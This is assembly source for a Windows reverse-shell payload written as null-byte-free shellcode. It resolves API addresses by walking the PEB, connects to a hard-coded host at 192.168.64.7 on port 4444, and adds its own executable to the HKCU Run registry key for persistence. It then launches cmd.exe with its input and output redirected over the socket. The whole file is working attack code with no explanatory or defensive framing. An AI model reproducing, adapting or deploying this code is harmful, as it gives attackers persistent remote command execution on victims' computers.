.386
Option CaseMap:None

.Code
start:
	Assume Fs:Nothing
	Sub Esp, 250H
	Xor Eax, Eax
	Mov [Ebp - 4H], Eax			; This will store the number of exported function in kernel32.dll
	Mov [Ebp - 8H], Eax			; This will store the address of exported table
	Mov [Ebp - 0CH], Eax			; This will store the address of exported name table
	Mov [Ebp - 10H], Eax			; This will store the address of ordinal table
	Mov [Ebp - 14H], Eax			; This will store the address of GetProcAddress
	Mov [Ebp - 18H], Eax			; This will store the address of LoadLibraryA
	Mov [Ebp - 1CH], Eax			; This will store WaitForSingleObject base address
	Mov [Ebp - 20H], Eax			; This will store ws2_32.dll base address
	Mov [Ebp - 24H], Eax			; This will store WSStartup base address
	Mov [Ebp - 28H], Eax			; This will store WSASocketA base address
	Mov [Ebp - 2CH], Eax			; This will store GetModuleFileNameA base address
	Mov [Ebp - 30H], Eax			; This will store Advapi32.dll base address
	Mov [Ebp - 34H], Eax			; This will store RegOpenKeyExA base address
	Mov [Ebp - 38H], Eax			; This will store RegSetValueEx base address
	Mov [Ebp - 3CH], Eax 			; This will store lstrlenA base address
	Mov [Ebp - 4AH], Eax			; This will store connect() base address
	Mov [Ebp - 4EH], Eax			; This will store the address of CreateProcessA
	Mov [Ebp - 52H], Eax			; This will store RegCloseKey base address
	Mov [Ebp - 56H], Eax			; This will store registry key handler
	Mov [Ebp - 150H], Eax			; This will store WSASocketA handle
	Mov [Ebp - 200H], Eax			; This will save the path of the the current process


	Mov Ax, 7373H
	Push Eax				; Avoid NULL bytes
	Push 65726464H
	Push 41636F72H
	Push 50746547H
	Mov [Ebp - 14H], Esp			; Push GetProcAddress

	Mov Eax, [Fs:30H]			; PEB
	Mov Eax, [Eax + 0CH]			; PEB_LDR_DATA
	Mov Eax, [Eax + 14H]			; InMemoryOrderModuleList
	Mov Eax, [Eax]				; Get pointer to the second (ntdll.dll) entry in InMemoryOrderModuleList
	Mov Eax, [Eax]				; Get pointer to the third (kernel32.dll) list in InMemoryOrderModuleList
	Mov Eax, [Eax + 10H]
	Mov Ebx, Eax				; Store kernel32.dll base address in ebx

	Mov Eax, [Ebx + 3CH]
	Add Eax, Ebx				; PE signature

	Mov Eax, [Eax + 78H]
	Add Eax, Ebx				; Address of Export Table

	; Get number of exported functions
	Mov Ecx, [Eax + 14H]
	Add Ecx, Ebx
	Mov [Ebp - 4H], Ecx

	; Get address of functions
	Mov Ecx, [Eax + 1CH]
	Add Ecx, Ebx
	Mov [Ebp - 8H], Ecx

	; Get address of name table
	Mov Ecx, [Eax + 20H]
	Add Ecx, Ebx
	Mov [Ebp - 0CH], Ecx

	; Get address of ordinal table
	Mov Ecx, [Eax + 24H]
	Add Ecx, Ebx
	Mov [Ebp - 10H], Ecx

	Xor Eax, Eax				; Counter for loop
	Xor Ecx, Ecx

getFunctionPosition:
	Mov Esi, [Ebp - 14H]	; Name of Function
	Mov Edi, [Ebp - 0CH]	; Pointer points to the start of name table
	Mov Edi, [Edi + Eax * 4]; RVA of next function name
	Add Edi, Ebx

	Mov Cx, 8
	Repe Cmpsb				; Compare edi, esi
	Jz getGetProcAddress			; If found the name then jump to getGetProcAddress
	Inc Eax
	Cmp Eax, [Ebp - 4H]			; Check for if counter < number of functions
	Jne getFunctionPosition ; Loop

; Calculate the ordinal of the function: (Address of ordinal table + position * sizeof(Ordinal))
; After got the ordinal then calculate the RVA of the function address: (RVA AddressOfFunction + ordinal * sizeof(FunctionRVA))
getGetProcAddress:
	Xor Ecx, Ecx
	Mov Ecx, [Ebp - 10H]			; Address of ordinal table
	Mov Edx, [Ebp - 8H]			; Address of function

	Mov Ax, [Ecx + Eax * 2]			; Get the function ordinal
	Mov Eax, [Edx + Eax * 4]
	Add Eax, Ebx				; Function address
	Jmp getFunctionAddress

; Using GetProcAddress to get the address of LoadLibraryA
; This part is used to find necessary libraries and functions
getFunctionAddress:
	Xor Ecx, Ecx
	Xor Edx, Edx
	Mov Edx, Eax
	Mov [Ebp - 14H], Edx			; Saving base address of GetProcAddress
	Push Ecx
	Push 41797261H				; aryA
	Push 7262694CH				; Libr
	Push 64616F4CH				; Load
	Push Esp
	Push Ebx				; Kernel32 base address
	Call Edx				; Call GetProcAddress
	Mov [Ebp - 18H], Eax			; Saving LoadLibraryA address

	; Load CreateProcessA
	Add Esp, 0CH
	Xor Ecx, Ecx
	Mov Edx, [Ebp - 14H]
	Mov Cx, 4173H
	Push Ecx
	Push 7365636FH
	Push 72506574H
	Push 61657243H
	Push Esp
	Push Ebx
	Call Edx
	Mov [Ebp - 4EH], Eax			; Saving CreateProcessA()

	; Load GetModuleFileNameA
	Add Esp, 8H
	Mov Edx, [Ebp - 14H]
	Xor Ecx, Ecx
	Mov Cx, 4165H
	Push Ecx
	Push 6D614E65H
	Push 6C694665H
	Push 6C75646FH
	Push 4D746547H
	Push Esp				; "GetModuleFileNameA"
	Push Ebx
	Call Edx
	Mov [Ebp - 2CH], Eax			; Saving GetModuleFileNameA base address

	; Load WaitForSingleObject
	Add Esp, 14H				; Clear "GetModuleFileNameA" from the stack
	Mov Edx, [Ebp - 14H]
	Push 61746365H
	Sub DWord Ptr [Esp + 3H], 61H
	Push 6A624F65H
	Push 6C676E69H
	Push 53726F46H
	Push 74696157H
	Push Esp				; WaitForSingleObject
	Push Ebx
	Call Edx
	Mov [Ebp - 1CH], Eax			; Saving WaitForSingleObject()

	; Load lstrlenA
	Add Esp, 14H
	Mov Edx, [Ebp - 14H]
	Xor Ecx, Ecx
	Push Ecx
	Push 416E656CH
	Push 7274736CH
	Push Esp					; "lstrlenA"
	Push Ebx
	Call Edx
	Mov [Ebp - 3CH], Eax

	; The returned data is saved to eax register
	; Load ws2_32.dll using LoadLibraryA
	Mov Eax, [Ebp - 18H]
	Add Esp, 8H				; Clear lstrlenA from the stack
	Xor Ecx, Ecx
	Mov Cx, 6C6CH				; ll
	Push Ecx
	Push 642E3233H				; 32.d
	Push 5F327377H				; ws2_
	Push Esp				; ws2_32.dll
	Call Eax				; Call LoadLibraryA
	Mov [Ebp - 20H], Eax			; Saving ws2_32 base address

	; Get WSAStartup address
	Add Esp, 0CH				; Clear ws2_32.dll from the stack
	Xor Ecx, Ecx
	Mov Edx, [Ebp - 14H]
	Mov Cx, 7075H
	Push Ecx
	Push 74726174H
	Push 53415357H
	Push Esp 				; WSAStartup
	Push Eax				; ws2_32.dll base address
	Call Edx				; GetProcAddress
	Mov [Ebp - 24H], Eax			; Saving WSAStartup address

	; Get WSASocketA address
	Add Esp, 0CH				; Clear WSAStartup from the stack
	Xor Ecx, Ecx
	Mov Edx, [Ebp - 14H]			; Base address of GetProcAddress
	Mov Eax, [Ebp - 20H]			; ws2_32 base address
	Mov Cx, 4174H
	Push Ecx
	Push 656B636FH
	Push 53415357H
	Push Esp
	Push Eax
	Call Edx				; GetProcAddress
	Mov [Ebp - 28H], Eax			; Saving WSASocketA base address

	; Get connect() base address
	Add Esp, 0CH				; Clear WSASocketA from the stack
	Xor Ecx, Ecx
	Mov Edx, [Ebp - 14H]
	Mov Eax, [Ebp - 20H]
	Mov Ecx, 61746365H
	Push Ecx
	Sub DWord Ptr [Esp + 3H], 61H
	Push 6E6E6F63H
	Push Esp 				; connect
	Push Eax				; ws2_32.dll base address
	Call Edx				; GetProcAddress
	Mov [Ebp - 4AH], Eax			; Saving connect() base address

	; Load Advapi32.dll using LoadLibraryA
	Mov Eax, [Ebp - 18H]
	Add Esp, 8H					; Clear connect() from the stack
	Push 6C6C642EH
	Push 32336970H
	Push 61766441H
	Push Esp
	Call Eax					; Call LoadLibraryA
	Mov [Ebp - 30H], Eax			; Saving Advapi32.dll base address

	; Get RegOpenKeyExA base address
	Add Esp, 0CH				
	Mov Edx, [Ebp - 14H]
	Mov Eax, [Ebp - 30H]
	Xor Ecx, Ecx
	Mov Cl, 41H
	Push Ecx
	Push 78457965H
	Push 4B6E6570H
	Push 4F676552H
	Push Esp
	Push Eax					; Advapi32.dll base address
	Call Edx					; GetProcAddress
	Mov [Ebp - 34H], Eax				; Saving RegOpenKeyEx base address

	; Get RegSetValueExA base address
	Add Esp, 0CH					; Clearing the stack
	Xor Ecx, Ecx
	Mov Edx, [Ebp - 14H]
	Mov Eax, [Ebp - 30H]
	Mov Cx, 4178H
	Push Ecx
	Push 4565756CH
	Push 61567465H
	Push 53676552H
	Push Esp 					; RegSetValueEx
	Push Eax					; Advapi32.dll base address
	Call Edx					; GetProcAddress
	Mov [Ebp - 38H], Eax				; Saving RegSetValueEx base address

	; Get RegCloseKey base address
	Add Esp, 10H
	Xor Ecx, Ecx
	Mov Edx, [Ebp - 14H]
	Mov Eax, [Ebp - 30H]
	Mov Ecx, 6179654BH
	Push Ecx
	Sub DWord Ptr [Esp + 3H], 61H
	Push 65736F6CH
	Push 43676552H
	Push Esp
	Push Eax
	Call Edx
	Mov [Ebp - 52H], Eax				; Saving RegCloseKey base address

shell:
	; System call: WSAStartup
	Xor Edx, Edx
	Xor Ecx, Ecx
	Mov Dx, 190H
	Sub Esp, Edx				; Creating space for WSAData
	Push Esp				; lpWSAData
	Mov Cx, 202H
	Push Ecx
	Mov Eax, [Ebp - 24H]
	Call Eax

	; System call: WSASocketA
	Xor Eax, Eax
	Push Eax				; dwFlags = NULL
	Push Eax				; g = NULL
	Push Eax				; lpProtocolInfo = NULL
	Xor Edx, Edx
	Mov Dl, 6H
	Push Edx				; protocol = 6 = IPPROTO_TCP
	Inc Eax
	Push Eax				; type = 1
	Inc Eax
	Push Eax				; af = 2
	Mov Eax, [Ebp - 28H]
	Call Eax
	Mov [Ebp - 150H], Eax			; WSASocketA() Handler
	Mov Ebx, [Ebp - 150H]

	; Sytem call: connect
	; connect(SOCKET s, const addr *name, int namelen)
	; listen on port 4444 (0x5C11), IPv4 set to AF_INET (0x0002) => 5C110002
	; listen on all interfaces
	Mov Eax, 0740A8C0H 			; 192.168.64.7
	Push Eax
	Mov Eax, 5C110102H
	Dec Ah					; 5C110102 => 5C110002 (Remove 01)
	Push Eax
	Mov Esi, Esp
	Xor Eax, Eax
	Mov Ax, 10H
	Push Eax				; namelen = 16 bytes
	Push Esi				; *name: 5C110002
	Push Ebx				; Arg 1(s): WSASocketA() Handler
	Mov Eax, [Ebp - 4AH]			; connect()
	Call Eax

	; Retrieve the path of the current process
	Xor Eax, Eax
	Xor Ecx, Ecx
	Mov Ax, 64H
	Push Eax					; nSize = 100 bytes
	Lea Eax, [Ebp - 200H]
	Push Eax					; lpFileName
	Push Ecx					; hModule = NULL
	Mov Eax, [Ebp - 2CH]
	Call Eax					; GetModuleFileNameA

SetRegistryKey:
	Xor Ecx, Ecx
	Mov Cl, 6EH
	Push Ecx
	Push 75525C6EH
	Push 6F697372H
	Push 6556746EH
	Push 65727275H
	Push 435C7377H
	Push 6F646E69H
	Push 575C7466H
	Push 6F736F72H
	Push 63694D5CH
	Push 65726177H
	Push 74666F53H
	Mov Edx, Esp					; edx = Pointer to "Software\Microsoft\Windows\CurrentVersion\Run"
	Xor Ecx, Ecx

	; Set hKey with RegOpenKeyExA
	Lea Ebx, [Ebp - 56H]
	Push Ebx						; phkResult
	Push 2H							; samDesired = KEY_SET_VALUE
	Push Ecx						; ulOptions = NULL
	Push Edx						; lpSubkey
	Push 80000001H					; hKey = HKEY_CURRENT_USER
	Mov Eax, [Ebp - 34H]
	Call Eax						; Call RegOpenKeyEx
	Add Esp, 48H					; Clearing the stack

	Mov Eax, [Ebp - 3CH]			; Save lstrlenA address to eax
	Lea Edx, [Ebp - 200H]			; Pointer to buffer that stores exe path
	Push Edx
	Call Eax						; Call lstrlenA

	Mov Edi, [Ebp - 56H]			; edi = hKey
	Xor Ecx, Ecx
	Push Ecx						; NULL
	Push 74696873H					; "shit"
	Mov Ebx, Esp					; ebx = Pointer to "shit" string

	; RegSetValueExA
	Lea Edx, [Ebp - 200H]			; Pointer to buffer that stores exe path
	Push Eax						; cbData
	Push Edx						; lpData = pointer to the path of the exe
	Inc Ecx
	Push Ecx						; dwType = REG_SZ
	Dec Ecx
	Push Ecx						; Reserved
	Push Ebx						; lpValueName
	Push Edi						; hKey
	Mov Eax, [Ebp - 38H]
	Call Eax						; Call RegSetValueExA

	Push Edi
	Mov Eax, [Ebp - 52H]			; Move RegCloseKey address to eax
	Call Eax						; Call RegCloseKey

	; CreateProcessA
	Push 61646D63H						; "acmd"
	Sub DWord Ptr [Esp + 3H], 61H				; Remove "a"
	Mov Edx, Esp						; edx = pointer to "cmd" string

	; STARTUPINFO struct
	Mov Ebx, [Ebp - 150H]
	Push Ebx						; SetStdInput to WSASocketA() handler
	Push Ebx						; SetStdOutput to WSASocketA() handler
	Push Ebx						; SetStdError to WSASocketA() handler
	Xor Ebx, Ebx
	Xor Ecx, Ecx
	Add Cl, 12H						; ecx = 18

zero_mem_struct:
	Push Ebx						; 0
	Loop zero_mem_struct					; Throw 0x00000000 into the stack 18 times
	Mov Word Ptr [Esp + 3CH], 101H				; dwFlag (60 bytes from the top of the stack)
	Mov Byte Ptr [Esp + 10H], 44H
	Lea Eax, [Esp + 10H]

	; Calling CreateProcessA
	Push Esp						; Pointer to PROCESS_INFORMATION structure
	Push Eax						; Pointer to STARUPINFOA structure
	Push Ebx
	Push Ebx
	Push Ebx
	Inc Ebx
	Push Ebx						; bInheritAttributes = 1 (True)
	Dec Ebx					
	Push Ebx						; lpThreadAttributes = 0 (False)
	Push Ebx						; lpProcessAttributes
	Push Edx						; Pointer to cmdline
	Push Ebx						; lpApplicationName
	Mov Eax, [Ebp - 4EH]					; eax = CreateProcessA base address
	Call Eax						; Call CreateProcessA

	; Calling WaitForSingleObject
	Mov Edx, [Ebp - 1CH]					; Save WaitForSingleObject base address to edx
	Mov Eax, Esp						; eax = pointer to PROCESS_INFORMATON structure
	Push Ebx						; dwMiliseconds = 0
	Push Eax
	Call Edx						; Call WaitForSingleObject

End start
